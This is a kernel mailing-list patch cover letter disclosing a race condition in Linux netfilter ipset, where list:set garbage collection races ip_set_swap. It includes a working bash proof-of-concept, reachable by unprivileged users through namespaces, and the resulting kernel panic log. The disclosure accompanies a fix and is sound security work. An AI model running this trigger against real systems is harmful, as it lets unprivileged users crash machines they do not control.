Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 5F7A7378825
	for <netfilter-devel@vger.kernel.org>; Sat,  1 Aug 2026 12:10:18 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785586222; cv=none; b=dG5jAm1sFKVIztlYbJDp3hppMsiRVymykGL/lpdaOR6tukOnns2q8E1m0rH+v38uLWDwxXrqkP+pRiYdm0bFmARBpVV2Gk9AMoR+Aik7jnJ3uuWfOZsUByCdv2fo1j33qPjIS2MQLqWUzV7A1iZMUUbl/OoiSSWJRhvLCyqv+zs=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785586222; c=relaxed/simple;
	bh=cCmJXN58UelKcEorombe1JaRJQZLs92xTicoVCN1NDY=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=iDX9+Kg6GSF34a4CxqBsdJzhxpVYh7P0km1wh9KlQyYO8TsmN7WMdl0g6kyRGzf5XvwlR2QQm/u876TIGg9xQg35TeHGv6GOoe6z9cH5hg3b+wdQQq4bJXUInPGuGAyg6PbUUQ64wfHHsAJNCtQQk4YlPhIlXVg/YV0GoaFJIbQ=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=LfePALwt; arc=none smtp.client-ip=209.85.210.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="LfePALwt"
Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-84e84a6c4bfso1644546b3a.1
        for <netfilter-devel@vger.kernel.org>; Sat, 01 Aug 2026 05:10:17 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785586217; x=1786191017; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=H2/NaizPBwmG+7Bm62/Ff+tQ1ikos2B9zB0xFaR0kz8=;
        b=LfePALwtFe64RrGb6jr9xXrvSNS1hYcA2Yarrim+5cEfWRB3R+9eNBuY9LVJ7xovDg
         aNbnofDK78wlpySb+TvkDJM7g4SXLAz8y2k9NzCErPabOTNok1bLyf22kXE8ba3w8Ft+
         +/bJRL3V4NK0fUEsVs8zwuI9qrLVl7G+OtIewKZe2ezCEh5JkYa2fnKpPpijpXl2OWp5
         hfksSkaZovAFYbevyKAMrImvOIepjnSRQ1pYhV+xwx+Wn1gLfErJTFoyIFl/5NzpYkUb
         Wcp8N/ha62rxtZRVRUXgAk2CQ0qUb79TXhpHmYQOqZVsmPTxZu8E975ZNHFq5iIFRDAF
         wf1g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785586217; x=1786191017;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=H2/NaizPBwmG+7Bm62/Ff+tQ1ikos2B9zB0xFaR0kz8=;
        b=SkL7N2i/uJ88wyYbN+d5WE3Q6sg/gk8831hJ4WtMjjDWS0ame3En/2CgrPRMRsvcnD
         8xmmU6juxn6V0BN33JuBOrkEYrKauz3EsYDSo9PEb8O4uMCQqI9NEoKwpCc9cgBGeKPn
         w2UJsKzJU/8Tf7mN3k8GfujvTyImypPejKVReE6a2pOTOcwj8mCUUksXOZ/L8LRoRcpv
         oFYKfvYNwZ6B+kiiApn+18vFafgePJ8BbYPEPsl9eslWFKVRHK8QotrjGFFAmRIRKQxr
         KMlqZENDnkSGbz+lMeaka0yldf6pdMdJUcS384C2fc1Zo+IuMXYpVSUqOw+YaLCCLgLl
         OgXg==
X-Gm-Message-State: AOJu0YxoYBx9FjPqVjxxfYE9TdZmyGGkhsN9s4Z0Dm59EpLTjEnF1X5H
	UQKDDkKDmODeVUf6BlYmAGCmxV+P74doy81BnbQVTNzTf03Map1rPsEb0nyLjLLTT0dAcI5pud/
	NdjFVm/pml+7pxQ==
X-Gm-Gg: AR+sD106EH7VOZIGW8dhDrKucumuE3TXbXGe6nx9u6qRgjLGnrn2Y2dQvVKKYWuWW78
	N0FvmnSGw7qy1mrNq1vv7pIwc0rCgnqvZpQqPFjdcqivfVSxvCEzXCgWzll4e5aiUOd7OCNKENS
	PAItUxGARUH//C5SrYiOWPejtkmSlEkTNc2W6WZwiVYkMiUnPLZf0mYN8Jp7sqeIlQkEQ7YccLW
	UbQy7YjCcb/Q+NnEkxl1rrHNCWTcTVY6PpULFsTMGZy8JMkBqwfcJdEeZkJNIhdo++KIDRWz83g
	3TSs+LuwYffq1VzVNWzXAeltG8h7oPNA1ja5P/gxmHrFz5fsDtTL0gmpiNtl72DeVTg9eoPtNvL
	2CVipy405VD0GMBNbKESPHqCfbfz7pyn+aJALWW84AclBP5OGpQdSV2umw35Ld3lJ2+h0E6yMeE
	h2tp7sfU90svdrAgQUWiVWtGvgd/fgZULI1CbSnOkJCC1/fCsSfO61wDwbu3MOjQGLpQHfOMYPI
	Q==
X-Received: by 2002:a05:6a00:300f:b0:847:888f:9b0f with SMTP id d2e1a72fcca58-84ee486243amr2784779b3a.15.1785586216625;
        Sat, 01 Aug 2026 05:10:16 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84edc2d45e5sm1580587b3a.42.2026.08.01.05.10.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 01 Aug 2026 05:10:15 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netfilter-devel@vger.kernel.org,
	netdev@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	kadlec@netfilter.org,
	den@openvz.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	xmei5@asu.edu,
	kees@kernel.org,
	sbrivio@redhat.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: ipset: serialize kernel-side put-byindex with swap
Date: Sat,  1 Aug 2026 20:10:01 +0800
Message-ID: <cover.1785583673.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/ipset/ip_set_core.c and
net/netfilter/ipset/ip_set_list_set.c. The bug is reachable by a non-root
user via user and net namespaces.

We've prepared a minimal fix locally, and it should not affect normal
functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

list:set garbage collection removes expired member sets through
ip_set_put_byindex(), which resolves inst->ip_set_list[index] before
taking ip_set_ref_lock. ip_set_swap() swaps the indexed set pointers and
their corresponding refcounts while holding that same lock.

If garbage collection fetches the old pointer for an index and then loses
the lock race to ip_set_swap(), it decrements the pre-swap object after
its refcount has already been transferred away. This can hit
BUG_ON(set->ref == 0) when the peer set had no references, or otherwise
under-reference a live set while leaving a phantom reference on the other
set.

Reproducer:

    chmod +x ./poc.sh
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
IPSET=${IPSET:-$(command -v ipset)}

LISTS=${LISTS:-200}
SWAP_THREADS=${SWAP_THREADS:-4}
SWAP_BATCH=${SWAP_BATCH:-2000}
LIST_TIMEOUT=${LIST_TIMEOUT:-6}
ENTRY_TIMEOUT=${ENTRY_TIMEOUT:-1}
DURATION=${DURATION:-30}
WORKDIR=${WORKDIR:-/tmp/ipset-race}

cleanup() {
	set +e
	if [ -n "${pids:-}" ]; then
		kill $pids 2>/dev/null
		wait $pids 2>/dev/null
	fi
	"$IPSET" destroy >/dev/null 2>&1 || true
}

trap cleanup EXIT INT TERM

mkdir -p "$WORKDIR"
"$IPSET" destroy >/dev/null 2>&1 || true

{
	echo "create a hash:ip family inet hashsize 64 maxelem 64"
	echo "create b hash:ip family inet hashsize 64 maxelem 64"
	for i in $(seq 0 $((LISTS - 1))); do
		echo "create l$i list:set size 8 timeout $LIST_TIMEOUT"
	done
	for i in $(seq 0 $((LISTS - 1))); do
		echo "add l$i a timeout $ENTRY_TIMEOUT"
	done
} > "$WORKDIR/setup.ipset"

"$IPSET" restore < "$WORKDIR/setup.ipset"

for _ in $(seq 1 "$SWAP_BATCH"); do
	echo "swap a b"
done > "$WORKDIR/swaps.ipset"

pids=""
for _ in $(seq 1 "$SWAP_THREADS"); do
	(
		while :; do
			"$IPSET" restore < "$WORKDIR/swaps.ipset" >/dev/null 2>&1
		done
	) &
	pids="$pids $!"
done

sleep "$DURATION"

------END poc.sh--------

----BEGIN crash log----

kernel BUG at net/netfilter/ipset/ip_set_core.c:685!
[  193.252485] Oops: invalid opcode: 0000 [#1] SMP NOPTI
[  193.252953] CPU: 1 UID: 1028 PID: 1430 Comm: ipset Not tainted 6.12.95 #1
[  193.253454] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  193.254360] RIP: 0010:ip_set_put_byindex (build/../include/linux/rcupdate.h:839 build/../net/netfilter/ipset/ip_set_core.c:857 build/../net/netfilter/ipset/ip_set_core.c:869)
[  193.254789] Code: c7 c7 d0 a4 74 85 e8 da de 31 00 8b 43 34 85 c0 74 18 83 e8 01 48 c7 c7 d0 a4 74 85 89 43 34 e8 d1 dc 31 00 5b e9 06 09 59 00 <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
All code
========
   0:	c7 c7 d0 a4 74 85    	mov    $0x8574a4d0,%edi
   6:	e8 da de 31 00       	call   0x31dee5
   b:	8b 43 34             	mov    0x34(%rbx),%eax
   e:	85 c0                	test   %eax,%eax
  10:	74 18                	je     0x2a
  12:	83 e8 01             	sub    $0x1,%eax
  15:	48 c7 c7 d0 a4 74 85 	mov    $0xffffffff8574a4d0,%rdi
  1c:	89 43 34             	mov    %eax,0x34(%rbx)
  1f:	e8 d1 dc 31 00       	call   0x31dcf5
  24:	5b                   	pop    %rbx
  25:	e9 06 09 59 00       	jmp    0x590930
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  34:	00 
  35:	90                   	nop
  36:	90                   	nop
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   a:	00 
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  193.256104] RSP: 0018:ffffc90000108e30 EFLAGS: 00010246
[  193.256431] RAX: 0000000000000000 RBX: ffff8881148e8040 RCX: ffff888110c454c0
[  193.256868] RDX: 00000000000000ff RSI: 0000000000000000 RDI: ffffffff8574a4d4
[  193.257317] RBP: ffff888110c45480 R08: ffff88813bca33e8 R09: ffffc90000108ee8
[  193.257776] R10: 00000000000000bc R11: 00000000000007fc R12: ffff888110c454c0
[  193.258226] R13: 0000000000000000 R14: ffffc90000108ee0 R15: ffffc90000108ee0
[  193.258675] FS:  00007ab935d5f180(0000) GS:ffff88813bc80000(0000) knlGS:0000000000000000
[  193.259166] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  193.259515] CR2: 00007ab935d64000 CR3: 0000000105ae4004 CR4: 0000000000770ef0
[  193.259952] PKRU: 55555554
[  193.260122] Call Trace:
[  193.260279]  <IRQ>
[  193.260411]  list_set_del (build/../net/netfilter/ipset/ip_set_list_set.c:157)
[  193.260641]  set_cleanup_entries (build/../net/netfilter/ipset/ip_set_list_set.c:176)
[  193.260898]  list_set_gc (build/../net/netfilter/ipset/ip_set_list_set.c:575)
[  193.261146]  ? __pfx_list_set_gc (build/../net/netfilter/ipset/ip_set_list_set.c:179)
[  193.261400]  call_timer_fn (build/../kernel/time/timer.c:1725)
[  193.261696]  __run_timers (build/../kernel/time/timer.c:2355 (discriminator 1))
[  193.262016]  run_timer_softirq (build/../include/trace/events/timer.h:92)
[  193.262345]  handle_softirqs (build/../kernel/softirq.c:596 (discriminator 10))
[  193.262684]  __irq_exit_rcu (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1) build/../arch/x86/include/asm/bitops.h:232 (discriminator 1) build/../include/linux/thread_info.h:199 (discriminator 1) build/../include/linux/thread_info.h:215 (discriminator 1) build/../include/linux/sched.h:2283 (discriminator 1) build/../kernel/softirq.c:695 (discriminator 1) build/../kernel/softirq.c:742 (discriminator 1))
[  193.263001]  sysvec_apic_timer_interrupt (build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 17) build/../arch/x86/kernel/apic/apic.c:1061 (discriminator 17))
[  193.263406]  </IRQ>
[  193.263584]  <TASK>
[  193.263765]  asm_sysvec_apic_timer_interrupt (build/../arch/x86/include/asm/idtentry.h:697)
[  193.264192] RIP: 0010:_raw_spin_unlock_irqrestore (build/../include/linux/spinlock_api_smp.h:177 build/../kernel/locking/spinlock.c:198)
[  193.264645] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f 1f 44 00 00 e8 02 06 00 00 90 f7 c6 00 02 00 00 74 06 fb 0f 1f 44 00 00 <e9> 39 2e 27 00 66 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 90 90 90
All code
========
   0:	90                   	nop
   1:	90                   	nop
   2:	90                   	nop
   3:	90                   	nop
   4:	90                   	nop
   5:	90                   	nop
   6:	90                   	nop
   7:	90                   	nop
   8:	90                   	nop
   9:	90                   	nop
   a:	90                   	nop
   b:	90                   	nop
   c:	90                   	nop
   d:	f3 0f 1e fa          	endbr64
  11:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  16:	e8 02 06 00 00       	call   0x61d
  1b:	90                   	nop
  1c:	f7 c6 00 02 00 00    	test   $0x200,%esi
  22:	74 06                	je     0x2a
  24:	fb                   	sti
  25:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  2a:*	e9 39 2e 27 00       	jmp    0x272e68		<-- trapping instruction
  2f:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  36:	00 00 00 00 
  3a:	0f 1f 00             	nopl   (%rax)
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	e9 39 2e 27 00       	jmp    0x272e3e
   5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   c:	00 00 00 00 
  10:	0f 1f 00             	nopl   (%rax)
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  193.266138] RSP: 0018:ffffc9000182fa00 EFLAGS: 00000206
[  193.266553] RAX: 0000000000000001 RBX: ffff888100b5a040 RCX: 0000000000000000
[  193.267129] RDX: 0000000000000008 RSI: 0000000000000282 RDI: ffff888100aa6a40
[  193.267698] RBP: ffffc9000182fac0 R08: 0101010101010101 R09: ffff888105d42d00
[  193.268287] R10: ffff888105d42a40 R11: 000000000001a001 R12: ffffea0004175000
[  193.268853] R13: ffffea0004175000 R14: ffff888100aa6a40 R15: ffffea0004175000
[  193.269450]  get_partial_node.part.0+0x12d/0x300
[  193.269836]  ? netlink_sendmsg (build/../include/linux/sched/signal.h:682 build/../include/net/scm.h:98 build/../net/netlink/af_netlink.c:1832)
[  193.270187]  ? __sys_sendto (build/../net/socket.c:2258)
[  193.270509]  ? __x64_sys_sendto (build/../net/socket.c:2268)
[  193.270840]  ___slab_alloc (build/../mm/slub.c:3705 (discriminator 1) build/../mm/slub.c:4459 (discriminator 1))
[  193.271206]  ? srso_alias_return_thunk (build/../arch/x86/lib/retpoline.S:220)
[  193.271586]  ? ___slab_alloc (build/../include/linux/local_lock_internal.h:60 build/../mm/slub.c:4771 build/../mm/slub.c:4883 build/../mm/slub.c:5414)
[  193.271903]  ? kmalloc_reserve (build/../net/core/skbuff.c:611 (discriminator 89))
[  193.272237]  ? nfnetlink_rcv_msg (build/../net/netfilter/nfnetlink.c:160 build/../net/netfilter/nfnetlink.c:245)
[  193.272585]  ? __alloc_skb (build/../net/core/skbuff.c:323 (discriminator 3) build/../net/core/skbuff.c:706 (discriminator 3))
[  193.272890]  kmem_cache_alloc_node_noprof (build/../mm/slub.c:4756 (discriminator 1) build/../mm/slub.c:4883 (discriminator 1) build/../mm/slub.c:4950 (discriminator 1))
[  193.273300]  kmalloc_reserve (build/../net/core/skbuff.c:611 (discriminator 89))
[  193.273607]  __alloc_skb (build/../net/core/skbuff.c:686)
[  193.273889]  netlink_ack (build/../arch/x86/include/asm/bitops.h:202 (discriminator 1) build/../arch/x86/include/asm/bitops.h:232 (discriminator 1) build/../include/asm-generic/bitops/instrumented-non-atomic.h:142 (discriminator 1) build/../net/netlink/af_netlink.c:2478 (discriminator 1))
[  193.274181]  ? __pfx_nfnetlink_rcv_msg (build/../net/netfilter/nfnetlink.c:152 (discriminator 1))
[  193.274547]  netlink_rcv_skb (build/../include/linux/netlink.h:18 build/../net/netlink/af_netlink.c:2536)
[  193.274857]  netlink_unicast (build/../net/netlink/af_netlink.c:1148 (discriminator 2) build/../net/netlink/af_netlink.c:1338 (discriminator 2))
[  193.275173]  netlink_sendmsg (build/../include/linux/sched/signal.h:682 build/../include/net/scm.h:98 build/../net/netlink/af_netlink.c:1832)
[  193.275491]  __sys_sendto (build/../net/socket.c:2258)
[  193.275794]  __x64_sys_sendto (build/../net/socket.c:2268)
[  193.276119]  do_syscall_64 (build/../include/linux/sched/task_stack.h:23 build/../arch/x86/include/asm/entry-common.h:43 build/../include/linux/irq-entry-common.h:100 build/../include/linux/entry-common.h:174 build/../arch/x86/entry/syscall_64.c:89)
[  193.276425]  entry_SYSCALL_64_after_hwframe (build/../arch/x86/entry/entry_64.S:121)
[  193.276835] RIP: 0033:0x7ab935df6687
[  193.277144] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[  193.278614] RSP: 002b:00007ffeb471a2a0 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  193.279232] RAX: ffffffffffffffda RBX: 00007ab935d5f180 RCX: 00007ab935df6687
[  193.279807] RDX: 000000000000002c RSI: 000057af975d4d18 RDI: 0000000000000003
[  193.280379] RBP: 000057af975d4d18 R08: 00007ab935d64000 R09: 000000000000000c
[  193.280961] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000001000
[  193.281532] R13: 000057af975d7d30 R14: 00000000000006a0 R15: 000057af975d42bf
[  193.282103]  </TASK>
[  193.282286] Modules linked in:
[  193.282590] ---[ end trace 0000000000000000 ]---
[  193.282983] RIP: 0010:ip_set_put_byindex (build/../include/linux/rcupdate.h:839 build/../net/netfilter/ipset/ip_set_core.c:857 build/../net/netfilter/ipset/ip_set_core.c:869)
[  193.283362] Code: c7 c7 d0 a4 74 85 e8 da de 31 00 8b 43 34 85 c0 74 18 83 e8 01 48 c7 c7 d0 a4 74 85 89 43 34 e8 d1 dc 31 00 5b e9 06 09 59 00 <0f> 0b 90 0f 1f 84 00 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90
All code
========
   0:	c7 c7 d0 a4 74 85    	mov    $0x8574a4d0,%edi
   6:	e8 da de 31 00       	call   0x31dee5
   b:	8b 43 34             	mov    0x34(%rbx),%eax
   e:	85 c0                	test   %eax,%eax
  10:	74 18                	je     0x2a
  12:	83 e8 01             	sub    $0x1,%eax
  15:	48 c7 c7 d0 a4 74 85 	mov    $0xffffffff8574a4d0,%rdi
  1c:	89 43 34             	mov    %eax,0x34(%rbx)
  1f:	e8 d1 dc 31 00       	call   0x31dcf5
  24:	5b                   	pop    %rbx
  25:	e9 06 09 59 00       	jmp    0x590930
  2a:*	0f 0b                	ud2		<-- trapping instruction
  2c:	90                   	nop
  2d:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  34:	00 
  35:	90                   	nop
  36:	90                   	nop
  37:	90                   	nop
  38:	90                   	nop
  39:	90                   	nop
  3a:	90                   	nop
  3b:	90                   	nop
  3c:	90                   	nop
  3d:	90                   	nop
  3e:	90                   	nop
  3f:	90                   	nop

Code starting with the faulting instruction
===========================================
   0:	0f 0b                	ud2
   2:	90                   	nop
   3:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   a:	00 
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
  10:	90                   	nop
  11:	90                   	nop
  12:	90                   	nop
  13:	90                   	nop
  14:	90                   	nop
  15:	90                   	nop
[  193.284848] RSP: 0018:ffffc90000108e30 EFLAGS: 00010246
[  193.285280] RAX: 0000000000000000 RBX: ffff8881148e8040 RCX: ffff888110c454c0
[  193.285860] RDX: 00000000000000ff RSI: 0000000000000000 RDI: ffffffff8574a4d4
[  193.286435] RBP: ffff888110c45480 R08: ffff88813bca33e8 R09: ffffc90000108ee8
[  193.287099] R10: 00000000000000bc R11: 00000000000007fc R12: ffff888110c454c0
[  193.287884] R13: 0000000000000000 R14: ffffc90000108ee0 R15: ffffc90000108ee0
[  193.288714] FS:  00007ab935d5f180(0000) GS:ffff88813bc80000(0000) knlGS:0000000000000000
[  193.289450] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  193.289992] CR2: 00007ab935d64000 CR3: 0000000105ae4004 CR4: 0000000000770ef0
[  193.290776] PKRU: 55555554
[  193.291103] Kernel panic - not syncing: Fatal exception in interrupt
[  193.292036] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: ipset: serialize kernel-side put-byindex with swap

 net/netfilter/ipset/ip_set_core.c | 11 +++++++++--
 1 file changed, 9 insertions(+), 2 deletions(-)

-- 
2.43.0

